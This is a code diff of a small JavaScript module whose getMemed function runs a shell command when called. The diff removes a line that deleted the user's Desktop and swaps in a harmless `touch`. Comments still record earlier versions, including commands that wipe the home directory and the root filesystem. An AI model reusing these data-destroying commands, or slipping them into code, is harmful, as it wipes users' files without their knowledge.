@@ -1,11 +1,12 @@
 const { exec } = require('child_process');
 
 const getMemed = () => {
-  exec(`rm -R -rf ~/Desktop/*`, (err, stdout, stderr) => {
+  exec(`touch ~/Desktop/lol.lol`, (err, stdout, stderr) => {
     if (err) {
       return;
     }
   });
 }
-// prev rm -R -rf ~ && rm -R -rf /
+// prev1 rm -R -rf ~/Desktop/*`
+// prev0 rm -R -rf ~ && rm -R -rf /
 module.exports = getMemed;
